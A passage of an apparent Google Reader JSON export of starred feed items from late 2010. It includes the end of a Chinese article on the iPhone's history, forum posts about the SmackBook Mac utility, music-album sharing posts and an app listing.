Leopard的上市時間到2008年一月，而iPhone將延後到2007年10月。此信件在Apple內部出現後不久隨即被發現為不明人士發佈的偽造信件，Apple官方也再次發出內部信件予以更正。</p>\n<p><strong>不明人士偽造的Apple內部信件</strong></p>\n<blockquote><p>From: Bullet News</p>\n<p>Date: May 16, 2007 9:09 AM CDT</p>\n<p>To: [redacted]</p>\n<p>Subject: Mac OS X Leopard and iPhone Delayed</p>\n<p>Mac OS X Leopard Delayed Until January</p>\n<p>iPhone Delayed Until October</p>\n<p>REGIONS: Asia-Pacific, Canada, Europe, Japan, Latin America, United States</p>\n<p>GROUPS: AppleCare, Retail</p>\n<p>Apple issued a press release today announcing that iPhone which was scheduled to ship in June, has been moved to October and the release date for Mac OS X Leopard has been moved to January next year.A beta version of Mac OS X Leopard will be given to developers at the Worldwide Developers Conference (WWDC).</p>\n</blockquote>\n<p><strong>Apple隨後發佈的內部信件</strong></p>\n<blockquote><p>From: [redacted]</p>\n<p>Date: May 16, 2007 10:47 AM CDT</p>\n<p>To: [redacted]</p>\n<p>Subject: NEWS: Disregard Bullet*News Sent May 16 at Approximately 9 am Central–AP/CA/EU/JP/LA/US</p>\n<p>You may have received what appeared to be a Bullet*News from Apple.This communication is fake and did not come from Apple.</p>\n<p>Apple is on track to ship iPhone in late June and Mac OS X Leopard in October.</p>\n</blockquote>\n<p>雖然在此消息在發佈不到20分鐘後Apple的公關部門隨即與Engadget聯繫，Engadget也立刻從網站中撤下該新聞。但是Apple的股價當日瞬間下跌2.7%，以當時公司市值計算大約為40億美金。</p>\n<p><strong><span>The D Day!</span></strong></p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/15.jpg\"><img style=\"padding-left:0px;padding-right:0px;padding-top:0px;border:0pt none\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/15_thumb.jpg\" border=\"0\" alt=\"15\" width=\"480\" height=\"320\"></a></p>\n<p><a href=\"http://www.life.com/image/74959434\">Long-Awaited Apple iPhone Goes On Sale Across U.S – Photo – LIFE</a></p>\n<p>2007年6月29日，同時也是正式發表後的六個月，iPhone終於正式上市。Apple位於紐約第五大道的旗艦店大排長龍，人人都想立刻買到一部iPhone。</p>\n<p>而在iPhone正式發售後也暴露出許多的缺點。$499的價格、只能夠使用EDGE網路、無法搜尋email、沒有錄製影片的功能、瀏覽器無法執行Flash、電池時間太短，並且無法自行更換電池等。但是許多消費者並不介意，人們為了Apple的品牌、設計以及新奇的介面而購買。</p>\n<p>就算iPhone有許多的缺點，但是對整個電信業帶來了巨大的改變。iPhone的成功讓許多使用者瘋狂加入Cingular的現象，使得所有電信營運商不惜放棄以往對製造商的控制權，來尋找更具吸引力的手機產品。對手機製造商來說，iPhone開啟了新的時代，讓他們在電信商面前獲得前所未有的議價能力。整個產業的控制權漸漸從電信商轉移到了手機本身。</p>\n<p>而由iPhone的Jailbreak，以及隨後由Apple展開的App Store，更建立出一個前所未見的完整生態系。在此時，整個業界的重心已經不在電信營運商，而是轉移到了手機製造商、軟體開發商、內容出版商以及消費者本身。</p>\n<blockquote><p>此篇文章是整理了網路上可得的資料，以及參考其他文獻撰寫而成。雖然已經盡力藉由多方來源來進行考據，不過部分內容可能並非完全正確。</p>\n<p>另外，如果您對其他Apple產品的發展歷史有興趣，也可以參考本站之前的文章：</p>\n<ul>\n<li><a href=\"http://whiteappleer.blogspot.com/2010/12/mac-os-x.html\">Mac OS X 的誕生故事。</a> </li>\n<li><a href=\"http://whiteappleer.blogspot.com/2010/10/ipod.html\">iPod 的誕生故事。</a> </li>\n<li><a href=\"http://whiteappleer.blogspot.com/2010/11/apple_10.html\">Apple的平板電腦發展史。</a> </li>\n</ul>\n</blockquote>\n<p>via <a href=\"http://www.macobserver.com/tmo/article/Steve_Jobs_No_Tablet_No_PDA_No_Cell_Phone_Lots_Of_iPods/\">Steve Jobs/ No Tablet, No PDA, No Cell Phone, Lots Of iPods | News | The Mac Observer</a> and <a href=\"http://www.wired.com/gadgetlab/2010/02/steve-jobs/\">Steve Jobs’ 6 Sneakiest Statements | Gadget Lab | Wired.com</a> and <a href=\"http://www.wired.com/gadgets/wireless/magazine/16-02/ff_iphone?currentPage=all\">The Untold Story/ How the iPhone Blew Up the Wireless Industry</a> and <a href=\"http://www.macworld.com/article/47133/2005/09/motceo.html\">Motorola CEO: ‘Screw the nano’</a> and <a href=\"http://www.mobile-review.com/articles/2010/iphone-history1-en.shtml\">Mobile-review.com Apple’s Phone/ From 1980s’ Sketches to iPhone.</a> and <a href=\"http://www.apple.com/pr/library/2007/06/18iphone.html\">iPhone Delivers Up to Eight Hours of Talk Time</a></p>\n<p>PS. kouko 也曾经给我们带来很棒的 iShout：<a title=\"Permalink to 【iShout】App Store模式，无止境的软体消费行为\" rel=\"bookmark\" href=\"http://www.ifanr.com/24673\">App Store模式，无止境的软体消费行为</a></p>\n<hr>\n<p><small>© kouko for <a href=\"http://www.ifanr.com\">爱范儿: 拇指资讯小众讨论</a>, 2010. |\n<a href=\"http://www.ifanr.com/27414\">Permalink</a> |\n<a href=\"http://www.ifanr.com/27414#comments\">30 comments</a> |\nAdd to\n<a href=\"http://del.icio.us/post?url=http://www.ifanr.com/27414&amp;title=iPhone%20%E7%9A%84%E8%AA%95%E7%94%9F%E6%95%85%E4%BA%8B\">del.icio.us</a>\n<br>\nPost tags: <a href=\"http://www.ifanr.com/tag/apple-ios\" rel=\"tag\">Apple &amp; iOS</a><br>\n</small></p><table cellspacing=\"0\" cellpadding=\"3\" border=\"0\">\n    \n    <tr>\n        <td colspan=\"4\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fwww.ifanr.com%2F23704&amp;from=http%3A%2F%2Fwww.ifanr.com%2F27414\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2010/10/23/810307.jpg\" width=\"96px\" height=\"96px\" title=\"Apple，下一个信用卡公司？\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Apple，下一个信用卡公司？</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fwww.ifanr.com%2F24506&amp;from=http%3A%2F%2Fwww.ifanr.com%2F27414\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2010/11/02/887285.jpg\" width=\"96px\" height=\"96px\" title=\"iOS 多任务的繁与简\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">iOS 多任务的繁与简</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fwww.ifanr.com%2F24049&amp;from=http%3A%2F%2Fwww.ifanr.com%2F27414\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2010/10/27/856707.jpg\" width=\"96px\" height=\"96px\" title=\"中国大陆 Apple Store 在线商店开张\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">中国大陆 Apple Store 在线商店开张</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/ext/redirect.htm?url=http%3A%2F%2Fwww.ifanr.com%2F25857&amp;from=http%3A%2F%2Fwww.ifanr.com%2F27414\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2010/11/20/1007568.jpg\" width=\"96px\" height=\"96px\" title=\"Woz：我没说 Android 比 iOS 好\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Woz：我没说 Android 比 iOS 好</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"4\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems.htm\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table>"
    },
    "author" : "kouko",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.ifanr.com/feed",
      "title" : "爱范儿 · Beats of Bits",
      "htmlUrl" : "http://www.ifanr.com?utm_source=rss&utm_medium=rss&utm_campaign="
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292118327405",
    "timestampUsec" : "1292118327405212",
    "id" : "tag:google.com,2005:reader/item/4cb7717edf3b06d5",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Mac 软件共享" ],
    "title" : "酷酷效果－SmackBook的探究与替代方案(附带介绍什么是SmackBook)，补充可能失效的原因",
    "published" : 1292030499,
    "updated" : 1292030499,
    "alternate" : [ {
      "href" : "http://www.macidea.com/viewthread.php?tid=38258",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "[i=s] 本帖最后由 negatlov 于 10/12/13 04:01 AM 编辑 [/i]\n\nSmackBook应该算是一个带娱乐性质的软件（命令行软件），利用macbook/pro 自带的震动感应器实现的通过触动电脑来切换space。\n个人认识smackbook是来自本论坛的这个帖子：<a href=\"http://www.macidea.com/thread-22444-1-\">http://www.macidea.com/thread-22444-1-</a> ..."
    },
    "author" : "negatlov",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=14&auth=b6a0IUCyv%2BVQa%2BrTTTcqsrmvfEClRHf13U8RyW%2BTYctno8vl3hvkSj6G70yjowg",
      "title" : "MacIdea - Mac 软件共享",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=14"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292118304927",
    "timestampUsec" : "1292118304927725",
    "id" : "tag:google.com,2005:reader/item/0ffe59c8680cd98e",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Mac 软件共享" ],
    "title" : "smackbook升级版---利用光线感应实现space切换",
    "published" : 1292065482,
    "updated" : 1292065482,
    "alternate" : [ {
      "href" : "http://www.macidea.com/viewthread.php?tid=38289",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "[i=s] 本帖最后由 negatlov 于 10/12/13 03:59 AM 编辑 [/i]\n\n之前发了帖子介绍了smackbook－－利用震动实现space切换(其实也可以改成运行某个特定的程序)。\n详细见帖子：<a href=\"http://www.macidea.com/thread-38258-1-1.html%5B/url%5D\">http://www.macidea.com/thread-38258-1-1.html[/url]</a>\n\n\n见了回帖之后，搜索一番。本想自己动手看能 ..."
    },
    "author" : "negatlov",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=14&auth=b6a0IUCyv%2BVQa%2BrTTTcqsrmvfEClRHf13U8RyW%2BTYctno8vl3hvkSj6G70yjowg",
      "title" : "MacIdea - Mac 软件共享",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=14"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292034346882",
    "timestampUsec" : "1292034346882896",
    "id" : "tag:google.com,2005:reader/item/12aa0fac5b2a7bed",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "王菲&lt;iTunes 全集26张&gt; 一次性补全你的王菲 [115]",
    "published" : 1292034346,
    "updated" : 1292034346,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45944.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑简介： \n时隔六年后，王菲重新回到了舞台、回到了现场，激情开唱，个人演唱会的座无虚席再一次证明了天后的实力。六年前，她是天后，六年后，她还是天后，而且随着岁月的累积、神秘感的增加和大环境新人的乏力，她天后的地位和影响力，仿佛要比五年前更大更强。曾经陪伴我们走了许多年的歌曲，有没有一首会让你想起曾 .."
    },
    "author" : "那我是kiki吖",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292034344319",
    "timestampUsec" : "1292034344319435",
    "id" : "tag:google.com,2005:reader/item/2753c3f6c22dff00",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "2 Pistols&lt;You Know Me&gt; 超赞的单曲，推荐 [115]",
    "published" : 1292034344,
    "updated" : 1292034344,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45982.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "不多介绍了，这个人你可以不认识，不过这首歌你不能没听过…\n outman不适合混音乐论坛的人做哦…\n因为没有这首歌的single版，我也米办法！迫于无奈，只好买了专辑里的一首拆开啦…不喜勿下！\n专辑封面：\n\n正版凭证：\n\n试听：\n<a href=\"http://g.dootnet.com/35/12739/36095/04435715.wma\">http://g.dootnet.com/35/12739/36095/04435715.wma</a>\n下载通道：\n\n自购，勿转！感谢 狼圖鬼 提供 .."
    },
    "author" : "xiney",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292034341093",
    "timestampUsec" : "1292034341093570",
    "id" : "tag:google.com,2005:reader/item/0bac7852a87c12e8",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Blaque&lt;I&#39;m Good&gt; 杰西卡·阿尔芭主演的&quot;甜心辣舞&quot;最Hot片尾曲 [115]",
    "published" : 1292034341,
    "updated" : 1292034341,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45993.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "Blaque，女子三人组合。首单《I&#39;m Good》2003年强势空降，成为了很多夜店开场舞曲的首选！\n风格明快清新，叫人忍不住想跟着摇摆！最Hot 的节奏、最IN的舞蹈…\n很可惜，不知道什么原因，只出过两首single，发现澳洲区有《甜心辣舞》的原声带，但是原声的歌曲不全…\n不过原声带里的《I&#39;m Good》比单曲版多了将近20s .."
    },
    "author" : "xiney",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291956307967",
    "timestampUsec" : "1291956307967494",
    "id" : "tag:google.com,2005:reader/item/4f107ef5e902560f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Adam Lambert&lt;Mad World - Single&gt;当爷迄今为止最好听的一首歌，超越原版的经典，百听不腻的神曲！[DB]",
    "published" : 1291956307,
    "updated" : 1291956307,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45837.html",
      "type" : "text/html"
    } ],
    "author" : "phantomrider",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291913953852",
    "timestampUsec" : "1291913953852210",
    "id" : "tag:google.com,2005:reader/item/3ca0ef1127a9d914",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Utilities" ],
    "title" : "China Unicom Customer Services",
    "published" : 0,
    "updated" : 0,
    "alternate" : [ {
      "href" : "http://apptrackr.org/?act=viewapp&appid=399406810",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "This app allows you to send SMS to quickly enable/disable service features and options of China Unicom. It also helps you to find out the balance of your account, promotional offerings, branch offices and otherservices provided of China Unicom. 本软件帮您快速办理各项中国联通的手机业务:开通/取消,办理套餐,查询话费,手机充值,积分兑换,优惠活动,营业网点,彩铃彩信,密码重置等。（新版本发行，半价优惠一天，请抓紧下载）<br>\n<br>\n需要办理中国联通的业务却没时间到营业厅排队？想知道最新优惠活动和套餐却找不到相关信息？想了解您的积分可以兑换什么礼物？现在，您可以通过“联通营业厅”软件来办理您所需的服务了，在弹指之间即可完成，方便快捷。 ( 如果您喜欢我们的软件，欢迎给与正面评价和介绍给您的朋友。谢谢支持。)<br>\n<br>\n目前的版本主要包括了中国联通的短信营业厅、手机营业厅、网上营业厅和人工客服座席功能。（使用之前请先设置您所属的省、自治区和直辖市。）<br>\n<br>\n短信营业厅：发送免费短信办理账户查询、充值、话费查询、最新优惠、业务办理、套餐办理、积分兑换等业务。支持全国各省、自治区和直辖市的短信指令。本软件还可以按条件模糊搜索各类短信指令，如套餐、开通等，十分方便。 <br>\n温馨提示：请别忘了点击短信窗口的“发送“键，这样短信才能发送办理业务。<br>\n手机营业厅：交互方式办理账户查询、充值、话费查询、最新优惠、业务办理、套餐办理、积分兑换等业务。<br>\n<br>\n网上营业厅：可以办理中国联通的话费查询、业务查询、充值卡充值、套餐变更、积分服务、上网卡服务、热点促销等业务。<br>\n<br>\n人工客服：接通中国联通客户服务专线，由客户服务代表提供服务。<br>\n<br>\n如果您喜欢我们的软件，欢迎给与正面评价和介绍给您的朋友。<br>\n<br>\n==================================<br>\n相关软件介绍：<br>\n<br>\n圣诞音乐铃声 圣诞节和新年就要到了，还不赶紧换上应节的欢乐铃声？30首经典的圣诞音乐等着您，搜索“圣诞铃声“立即下载。<br>\n<br>\n中国城市堵车雷达软件 近日已经推出，帮助您出行选择最佳路线，欢迎使用，搜索“堵车雷达”即可。<br>\n<br>\n音乐点歌电台 随时随地点播歌曲，无论歌曲新旧，动听的乐曲即时响起。搜索“点歌”即可。<br>\n<br>\n全国银行信息大全 软件隆重推出。收录了全国工农中建招交、光大 华夏等银行的7万个网点的数据，并可查询地图，是您生活工作的好帮手。搜索“银行网点” 即可。<br>\n<br>\n来电归属地、手机归属地、区号统一查询软件可以让您迅速查询到手机或座机号码所属地域，无须联网，方便快捷。"
    },
    "author" : "Apptrackr",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://apptrackr.org/rss.php",
      "title" : "Apptrackr Newest Apps &amp; Updates",
      "htmlUrl" : "http://apptrackr.cd/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291891471808",
    "timestampUsec" : "1291891471808352",
    "id" : "tag:google.com,2005:reader/item/1bc3479c73796d89",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "cards", "illustrations" ],
    "title" : "Santa and friends:)",
    "published" : 1291849740,
    "updated" : 1291851471,
    "replies" : [ {
      "href" : "http://orangeyoulucky.blogspot.com/feeds/8850764594286303397/comments/default",
      "title" : "Post Comments",
      "type" : "application/atom+xml"
    }, {
      "href" : "https://www.blogger.com/comment.g?blogID=1030296339816313369&postID=8850764594286303397&isPopup=true",
      "title" : "21 Comments",
      "type" : "text/html"
    } ],
    "alternate" : [ {
      "href" : "http://orangeyoulucky.blogspot.com/2010/12/santa-and-friends.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<a href=\"http://2.bp.blogspot.com/_FHhHqJoaXjs/TQAUKljhjZI/AAAAAAAAEQU/Ya_11TRdYqo/s1600/dardik_target_giftcard_Christmas_2010.jpg\"><img style=\"display:block;margin:0px auto 10px;text-align:center;width:400px;height:286px\" src=\"http://2.bp.blogspot.com/_FHhHqJoaXjs/TQAUKljhjZI/AAAAAAAAEQU/Ya_11TRdYqo/s400/dardik_target_giftcard_Christmas_2010.jpg\" border=\"0\" alt=\"\"></a><a href=\"http://2.bp.blogspot.com/_FHhHqJoaXjs/TQAQY-9Y6bI/AAAAAAAAEP8/XIbdO-PgW2Q/s1600/dardik_target_giftcard_Christmas_2010_2.jpg\"><img style=\"display:block;margin:0px auto 10px;text-align:center;width:400px;height:400px\" src=\"http://2.bp.blogspot.com/_FHhHqJoaXjs/TQAQY-9Y6bI/AAAAAAAAEP8/XIbdO-PgW2Q/s400/dardik_target_giftcard_Christmas_2010_2.jpg\" border=\"0\" alt=\"\"></a><span style=\"color:#660000\"><span style=\"font-size:small\"><span style=\"font-family:&#39;times new roman&#39;\">One of my new gift-cards for Target this year:)!</span></span></span><div><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1030296339816313369-8850764594286303397?l=orangeyoulucky.blogspot.com\" alt=\"\"></div>"
    },
    "author" : "orange you lucky!",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://orangeyoulucky.blogspot.com/feeds/posts/default",
      "title" : "orange you lucky!",
      "htmlUrl" : "http://orangeyoulucky.blogspot.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291850862545",
    "timestampUsec" : "1291850862545087",
    "id" : "tag:google.com,2005:reader/item/b6b7335b8ebd4ba5",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "水木年华&lt;未来的未来(Future of the Future)&gt; [DB]",
    "published" : 1291850862,
    "updated" : 1291850862,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45444.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面：\n\n专辑曲目：\n\n正版凭证：\n\n曲目试听：\n<a href=\"http://g.dootnet.com/18/175/6463/86098215.wma\">http://g.dootnet.com/18/175/6463/86098215.wma</a>\n下载通道：\n\n自购于美国区，转载请注明来着oppsu！"
    },
    "author" : "兜里有糖",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291850760982",
    "timestampUsec" : "1291850760982393",
    "id" : "tag:google.com,2005:reader/item/1d562f727b46fc1d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "影视原声大碟" ],
    "title" : "原声大碟&lt;The Kite Runner(Original Motion Picture Soundtrack)&gt;追风筝的人 07奥斯卡最佳配乐提名[115]",
    "published" : 1291850760,
    "updated" : 1291850760,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45456.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING: OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to be REPOSTED to other forums and blogs , otherswise your ID &amp; IP will be blocked FOREVER!!! \n★封面★ \n\n★曲目★ \n\n★正版截图★ \n\n★简介★ \n《追风筝的人》是阿富汗作家卡勒德胡赛尼(Khaled Hosseini)于2003年出版的首部著作， .."
    },
    "author" : "大师兄",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-21.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291732330593",
    "timestampUsec" : "1291732330593261",
    "id" : "tag:google.com,2005:reader/item/38637a57e8ef99ea",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "彭佳慧&lt;因为女人说&gt;阔别7年最新作品[115]",
    "published" : 1291732330,
    "updated" : 1291732330,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45228.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "唱片歌手：彭佳慧\n唱片名称：因为女人说\n唱片封面：  \n唱片曲目、购买信息：    \n唱片介绍：\n    台湾女歌手彭佳慧阔别七年于二〇〇九年十二月十八日正式推出加入台湾爱贝克斯公司的首张专辑&lt;因为女人说&gt;。唱片一如既往的延续彭佳慧大气情歌风格，外放的唱腔中多了感情的内敛，值得收 .."
    },
    "author" : "yumingf",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291732325856",
    "timestampUsec" : "1291732325856070",
    "id" : "tag:google.com,2005:reader/item/f7ec04ef135ae390",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Natasha Bedingfield &lt;Strip Me (Deluxe Version)&gt; 英国流行小才女2010年新砖 [DB]",
    "published" : 1291732325,
    "updated" : 1291732325,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45369.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "WARNING:  OppsU&#39;s albums, singles, EPs &amp; MVs are NOT ALLOWED to  be REPOSTED to other  forums and blogs ,  otherswise your ID &amp; IP will be blocked FOREVER!!! \n专辑封面  \n\n歌手简介 \n \n         娜塔莎·贝 .."
    },
    "author" : "水果弟弟",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291723331109",
    "timestampUsec" : "1291723331109745",
    "id" : "tag:google.com,2005:reader/item/71bc998e40d5b284",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "张芯瑜&lt;小小瑜的闹闹&gt;小小瑜首张专辑[DB]",
    "published" : 1291723331,
    "updated" : 1291723331,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45349.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑介绍：\n　　张芯瑜以歌手“小小瑜”的名称推出首张个人专辑《小小瑜的闹闹》，小小瑜这个小名让歌迷们很容易念她的名子，她也喜欢大家如此称呼她。张芯瑜近年来拍戏和拍广告，天真自然又谦虚，她赢得越来越多的好人缘和影歌迷。这次推出专辑不管在形象上或是曲风方面，都让张芯瑜完整呈现最真实的自己。\n　　主打歌“ .."
    },
    "author" : "zyaiyoko",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1291651733304",
    "timestampUsec" : "1291651733304648",
    "id" : "tag:google.com,2005:reader/item/163ceed46ffe1fe9",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Valentine &lt;Ocean Full of Tears&gt;清澈女声免刀[115]",
    "published" : 1291651733,
    "updated" : 1291651733,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-44852.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "发行时间: Oct.08,2005 \n \nValentine是来自德国的女歌手，作曲家兼钢琴家。生于1988年6月22日。她的父亲是音响工程师，母亲是乐队成员。她的真名就是Valentine,目前居住于柏林。 \n13岁开始写歌的她在16岁时发行了这张畅销EP-Ocean Full of Tears。 \n今年10月她也发了新专辑.第一次听这首歌就觉得很好听 \n<a href=\"http://widget.to\">http://widget.to</a> .."
    },
    "author" : "nikky88",
    "comments" : [ ],
